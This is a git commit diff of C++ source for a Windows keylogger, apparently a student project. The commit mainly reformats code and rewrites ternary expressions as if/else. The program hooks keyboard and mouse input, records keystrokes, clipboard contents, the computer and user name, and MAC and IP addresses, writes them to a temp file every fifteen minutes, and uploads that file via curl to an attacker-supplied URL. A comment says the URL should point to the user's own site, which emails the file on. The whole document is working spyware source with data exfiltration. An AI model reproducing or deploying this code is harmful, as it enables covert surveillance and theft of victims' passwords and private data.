f2cd00603f5c99fd40a21c1d3f972908ed69de52
brandovardi <brandovardipietro@outlook.it>
2025-04-15 10:15:57 +0200

    .

--- ProgettoTecnologie/main.cpp
+++ ProgettoTecnologie/main.cpp
@@ -9,6 +9,7 @@
 #include <sstream>
 #include <iomanip>
 #include <iphlpapi.h>
+#include <set>
 
 #include "curl/curl.h"
 
@@ -26,96 +27,95 @@
 #pragma comment(lib, "normaliz.lib") // normaliz.dll windows' library
 #pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library
 #pragma comment(lib, "advapi32.lib") // advapi32.dll windows' library
-#pragma comment(lib, "crypt32.lib") // crypt32.dll windows' library
-#pragma comment(lib, "wldap32.lib") // wldap32.dll windows' library
+#pragma comment(lib, "crypt32.lib")	 // crypt32.dll windows' library
+#pragma comment(lib, "wldap32.lib")	 // wldap32.dll windows' library
 
-#define VK_0	0x30	// '0'
-#define VK_1	0x31	// '1'
-#define VK_2	0x32	// '2'
-#define VK_3	0x33	// '3'
-#define VK_4	0x34	// '4'
-#define VK_5	0x35	// '5'
-#define VK_6	0x36	// '6'
-#define VK_7	0x37	// '7'
-#define VK_8	0x38	// '8'
-#define VK_9	0x39	// '9'
+#define VK_0 0x30 // '0'
+#define VK_1 0x31 // '1'
+#define VK_2 0x32 // '2'
+#define VK_3 0x33 // '3'
+#define VK_4 0x34 // '4'
+#define VK_5 0x35 // '5'
+#define VK_6 0x36 // '6'
+#define VK_7 0x37 // '7'
+#define VK_8 0x38 // '8'
+#define VK_9 0x39 // '9'
 
-#define VK_A	0x41	// 'A'
-#define VK_B	0x42	// 'B'
-#define VK_C	0x43	// 'C'
-#define VK_D	0x44	// 'D'
-#define VK_E	0x45	// 'E'
-#define VK_F	0x46	// 'F'
-#define VK_G	0x47	// 'G'
-#define VK_H	0x48	// 'H'
-#define VK_I	0x49	// 'I'
-#define VK_J	0x4A	// 'J'
-#define VK_K	0x4B	// 'K'
-#define VK_L	0x4C	// 'L'
-#define VK_M	0x4D	// 'M'
-#define VK_N	0x4E	// 'N'
-#define VK_O	0x4F	// 'O'
-#define VK_P	0x50	// 'P'
-#define VK_Q	0x51	// 'Q'
-#define VK_R	0x52	// 'R'
-#define VK_S	0x53	// 'S'
-#define VK_T	0x54	// 'T'
-#define VK_U	0x55	// 'U'
-#define VK_V	0x56	// 'V'
-#define VK_W	0x57	// 'W'
-#define VK_X	0x58	// 'X'
-#define VK_Y	0x59	// 'Y'
-#define VK_Z	0x5A	// 'Z'
+#define VK_A 0x41 // 'A'
+#define VK_B 0x42 // 'B'
+#define VK_C 0x43 // 'C'
+#define VK_D 0x44 // 'D'
+#define VK_E 0x45 // 'E'
+#define VK_F 0x46 // 'F'
+#define VK_G 0x47 // 'G'
+#define VK_H 0x48 // 'H'
+#define VK_I 0x49 // 'I'
+#define VK_J 0x4A // 'J'
+#define VK_K 0x4B // 'K'
+#define VK_L 0x4C // 'L'
+#define VK_M 0x4D // 'M'
+#define VK_N 0x4E // 'N'
+#define VK_O 0x4F // 'O'
+#define VK_P 0x50 // 'P'
+#define VK_Q 0x51 // 'Q'
+#define VK_R 0x52 // 'R'
+#define VK_S 0x53 // 'S'
+#define VK_T 0x54 // 'T'
+#define VK_U 0x55 // 'U'
+#define VK_V 0x56 // 'V'
+#define VK_W 0x57 // 'W'
+#define VK_X 0x58 // 'X'
+#define VK_Y 0x59 // 'Y'
+#define VK_Z 0x5A // 'Z'
 
 // redefine some keys for the Italian keyboard
 // SC stay for "Special Characters" with accent
-#define VK_SC_E				0xBA	// èé[{ (VK_OEM_3)
-#define VK_SC_O				0xC0	// òç@	(VK_OEM_1)
-#define VK_SC_A				0xDE	// à°#	(VK_OEM_7)
-#define VK_SC_U				0xBF	// ù§	(VK_OEM_2)
-#define VK_SC_I				0xDD	// ì^	(VK_OEM_6)
-#define VK_BACKSLASH			0xDC	// \|	(VK_OEM_5)
-#define VK_APOSTROPHE			0xDB	// '?	(VK_OEM_4)
+#define VK_SC_E 0xBA	   // èé[{ (VK_OEM_3)
+#define VK_SC_O 0xC0	   // òç@	(VK_OEM_1)
+#define VK_SC_A 0xDE	   // à°#	(VK_OEM_7)
+#define VK_SC_U 0xBF	   // ù§	(VK_OEM_2)
+#define VK_SC_I 0xDD	   // ì^	(VK_OEM_6)
+#define VK_BACKSLASH 0xDC  // \|	(VK_OEM_5)
+#define VK_APOSTROPHE 0xDB // '?	(VK_OEM_4)
 
 HHOOK hKeyboardHook; // istancing the keyboard hook
-HHOOK hMouseHook; // istancing the mouse hook
+HHOOK hMouseHook;	 // istancing the mouse hook
 
-char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
-DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
+char tempFolderPath[MAX_PATH];										   // istancing a char array to memorize the TempFolder Path
+DWORD result = GetTempPathA(MAX_PATH, tempFolderPath);				   // getting the TempFolder Path due to windows' function
 const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
 
 const std::chrono::seconds waitTime = std::chrono::seconds(int(15 * 60)); // seconds -> 15 minutes
 
 std::string clipBoardLastSave = ""; // saving the text saved in the windows' clipBoard
-std::string contentFile = ""; // save everything of what is been writing down
+std::string contentFile = "";		// save everything of what is been writing down
 
-char *my_url = ""; // --> you have to put your own website, in which you should have a ".php" file or somthing similar, where you send the file to your e-mail
+std::string my_url = ""; // --> you have to put your own website, in which you should have a ".php" file or somthing similar, where you send the file to your e-mail
 
 // Keyboard hook
 static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
-		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+		KBDLLHOOKSTRUCT *pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 		int vkCode = pKeyboardStruct->vkCode;
-		
+
 		const std::set<int> ignoredKeys = {
 			VK_ESCAPE, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7,
 			VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_CAPITAL,
 			VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL,
 			VK_LMENU, VK_RMENU, VK_APPS, VK_SNAPSHOT, VK_SCROLL,
-			VK_PAUSE, VK_CLEAR
-		};
-		
-		if (ignoredKeys.contains(vkCode))
+			VK_PAUSE, VK_CLEAR};
+
+		if (ignoredKeys.count(vkCode) > 0) // Check if the key is in the ignored keys set
 			return CallNextHookEx(NULL, nCode, wParam, lParam);
 
-		bool isShiftPressed   = GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000;
-		bool isCtrlPressed    = GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000;
-		bool isAltPressed     = GetAsyncKeyState(VK_LMENU) & 0x8000;
-		bool isAltGrPressed   = GetAsyncKeyState(VK_LCONTROL) & 0x8000 && GetAsyncKeyState(VK_RMENU) & 0x8000;
+		bool isShiftPressed = GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000;
+		bool isCtrlPressed = GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000;
+		bool isAltPressed = GetAsyncKeyState(VK_LMENU) & 0x8000;
+		bool isAltGrPressed = GetAsyncKeyState(VK_LCONTROL) & 0x8000 && GetAsyncKeyState(VK_RMENU) & 0x8000;
 		bool isCapsLockActive = GetKeyState(VK_CAPITAL) & 0x0001;
-		bool isNumLockActive  = GetKeyState(VK_NUMLOCK) & 0x0001;
+		bool isNumLockActive = GetKeyState(VK_NUMLOCK) & 0x0001;
 
 		std::string message("");
 
@@ -130,7 +130,7 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				if (hData != NULL)
 				{
 					// getting the text from the clipboard by locking it
-					char* text = static_cast<char*>(GlobalLock(hData));
+					char *text = static_cast<char *>(GlobalLock(hData));
 					if (text != NULL)
 					{
 						message.append("\n--- CTRL + (C/V) ---\n");
@@ -147,7 +147,11 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// checking TAB and SPACE
 		else if (!isShiftPressed && !isCapsLockActive && !isAltPressed && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
 		{
-			!(vkCode ^ VK_TAB) ? (message = "|TAB|") : ((vkCode ^ VK_SPACE) ?: (message = " "));
+			if (!(vkCode ^ VK_TAB))
+				message = "|TAB|";
+			else if (!(vkCode ^ VK_SPACE))
+				message = " ";
+			//- !(vkCode ^ VK_TAB) ? (message = "|TAB|") : ((vkCode ^ VK_SPACE) ?: (message = " "));
 		}
 		// checking lowercase letters
 		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && (vkCode >= VK_A && vkCode <= VK_Z) && !isCtrlPressed)
@@ -222,7 +226,11 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		// curly brackets
 		else if (isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS))
 		{
-			!(vkCode ^ VK_SC_E /* { */) ? (message = "{") : ((vkCode ^ VK_OEM_PLUS /* } */) ?: (message = "}"));
+			if (!(vkCode ^ VK_SC_E) /* { */)
+				message = "{";
+			else if (!(vkCode ^ VK_OEM_PLUS) /* } */)
+				message = "}";
+			//- !(vkCode ^ VK_SC_E /* { */) ? (message = "{") : ((vkCode ^ VK_OEM_PLUS /* } */) ?: (message = "}"));
 		}
 		// checking special characters
 		else if (isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A) || (vkCode >= VK_0 && vkCode <= VK_9)))
@@ -442,14 +450,14 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 // Check if the clipboard is open and if there is a possible copy
-static void checkPossibleCopy(std::string& mess)
+static void checkPossibleCopy(std::string &mess)
 {
 	if (OpenClipboard(NULL))
 	{
 		HANDLE hData = GetClipboardData(CF_TEXT);
 		if (hData != NULL)
 		{
-			char* text = static_cast<char*>(GlobalLock(hData));
+			char *text = static_cast<char *>(GlobalLock(hData));
 			if (text != NULL)
 			{
 				if (clipBoardLastSave != text)
@@ -474,7 +482,17 @@ static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 	{
 		std::string message = "";
 
-		!(wParam ^ WM_LBUTTONDOWN) ? (message = "|<M|") : (!(wParam ^ WM_RBUTTONDOWN) ? (message = "|M>|") : ((wParam ^ WM_MBUTTONDOWN) ?: (message = "|M|")));
+		if (!(wParam ^ WM_LBUTTONDOWN)) // left click
+			message = "|<M|";
+		else if (!(wParam ^ WM_RBUTTONDOWN)) // right click
+			message = "|M>|";
+		else if (!(wParam ^ WM_MBUTTONDOWN)) // middle click
+			message = "|M|";
+		// else if (wParam == WM_MOUSEMOVE) // mouse move
+		// 	message = "|MOVE|";
+		else if (wParam == WM_MOUSEWHEEL) // mouse wheel
+			message = "|WHEEL|";
+		//- !(wParam ^ WM_LBUTTONDOWN) ? (message = "|<M|") : (!(wParam ^ WM_RBUTTONDOWN) ? (message = "|M>|") : ((wParam ^ WM_MBUTTONDOWN) ?: (message = "|M|")));
 		checkPossibleCopy(message);
 		contentFile.append(message);
 	}
@@ -484,11 +502,14 @@ static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 // function to convert the MAC address from BYTE to string
-static void MACToString(const BYTE* MACData, std::string& macStr) {
+static void MACToString(const BYTE *MACData, std::string &macStr)
+{
 	std::ostringstream oss;
-	for (int i = 0; i < 6; ++i) {
+	for (int i = 0; i < 6; ++i)
+	{
 		oss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)MACData[i];
-		if (i < 5) {
+		if (i < 5)
+		{
 			oss << "-";
 		}
 	}
@@ -506,11 +527,13 @@ static std::string StartString()
 	DWORD pcname_len = sizeof(pcname) / sizeof(pcname[0]);
 	// PC name
 	startString = "\n------------------------------------\nComputer Name: ";
-	if (GetComputerName(pcname, &pcname_len)) {
+	if (GetComputerName(pcname, &pcname_len))
+	{
 		std::string pcnameStr(pcname, pcname + pcname_len);
 		startString.append(pcnameStr);
 	}
-	else startString.append("Impossibile ottenere il nome del computer.");
+	else
+		startString.append("Impossibile ottenere il nome del computer.");
 	// User Name
 	startString.append("\nUsername: ");
 	TCHAR username[256];
@@ -520,19 +543,23 @@ static std::string StartString()
 		std::string usernameStr(username, username + username_len);
 		startString.append(usernameStr);
 	}
-	else startString.append("Impossibile ottenere il nome utente.");
+	else
+		startString.append("Impossibile ottenere il nome utente.");
 	// IP and MAC Address
 	IP_ADAPTER_INFO AdapterInfo[16];
 	DWORD dwBufLen = sizeof(AdapterInfo);
 	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
-	if (dwStatus != ERROR_SUCCESS) {
+	if (dwStatus != ERROR_SUCCESS)
+	{
 		startString += "\nGetAdaptersInfo failed with error: " + dwStatus;
 	}
 	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
 	std::string macStr;
-	while (pAdapterInfo) {
+	while (pAdapterInfo)
+	{
 		// Filtrare gli adattatori fisici e ignorare loopback e virtuali
-		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000) ) {
+		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000))
+		{
 			startString += "\n";
 			startString += "\nWireless Connection--";
 			MACToString(pAdapterInfo->Address, macStr);
@@ -543,7 +570,8 @@ static std::string StartString()
 			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
 			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
 		}
-		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000)) {
+		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000))
+		{
 			startString += "\n";
 			startString += "\nEthernet Connection (Physycal MAC address)--";
 			MACToString(pAdapterInfo->Address, macStr);
@@ -556,7 +584,9 @@ static std::string StartString()
 		}
 		pAdapterInfo = pAdapterInfo->Next;
 	}
-	!(macStr.empty()) ?: (startString += "No physical adapter found.\n");
+	if (macStr.empty())
+		startString += "\nNo physical adapter found.\n";
+	//- !(macStr.empty()) ?: (startString += "No physical adapter found.\n");
 	startString += "\n";
 	// date & time
 	localtime_s(&currentTime, &now);
@@ -576,21 +606,23 @@ static std::string StartString()
 	return startString;
 }
 
-static void makeRequest() {
-	CURL* curl;
+static void makeRequest()
+{
+	CURL *curl;
 	CURLcode res;
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl = curl_easy_init();
 	// Check if the curl is correctly istanced
-	if (curl) {
+	if (curl)
+	{
 		curl_easy_setopt(curl, CURLOPT_URL, my_url);
 		// Imposting the file to send
-		struct curl_httppost* formpost = NULL;
-		struct curl_httppost* lastptr = NULL;
+		struct curl_httppost *formpost = NULL;
+		struct curl_httppost *lastptr = NULL;
 		curl_formadd(&formpost, &lastptr,
-			CURLFORM_COPYNAME, "file",
-			CURLFORM_FILE, FilePath.c_str(),
-			CURLFORM_END);
+					 CURLFORM_COPYNAME, "file",
+					 CURLFORM_FILE, FilePath.c_str(),
+					 CURLFORM_END);
 		// Set the form post parameter
 		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
 		// Make the request and check the result
@@ -605,16 +637,23 @@ static void makeRequest() {
 }
 
 // thread function
-static void timeCheck() {
+static void timeCheck()
+{
 	std::string tmp;
-	while (true) {
+	while (true)
+	{
 		// Wait x minutes
 		std::this_thread::sleep_for(waitTime);
 		tmp = contentFile;
 		// resetting the contentFile
 		contentFile = StartString();
 		std::ofstream outputFile(FilePath);
-		!(outputFile.is_open()) ?: (outputFile << tmp, outputFile.close());
+		if (outputFile.is_open())
+		{
+			outputFile << tmp; // writing the content of the file
+			outputFile.close(); // closing the file
+		}
+		//- !(outputFile.is_open()) ?: (outputFile << tmp, outputFile.close());
 		// sending the file to the server, and remove it into the thread
 		std::thread tSend(makeRequest);
 		// detach the thread from the execution, so I can send the file without stopping the keylogger
@@ -635,7 +674,8 @@ int main()
 	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
 	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance, 0);
 
-	if (hKeyboardHook == NULL || hMouseHook == NULL) return ERROR_HOOK_NOT_INSTALLED;
+	if (hKeyboardHook == NULL || hMouseHook == NULL)
+		return ERROR_HOOK_NOT_INSTALLED;
 
 	MSG msg;
 	while (GetMessage(&msg, nullptr, 0, 0))
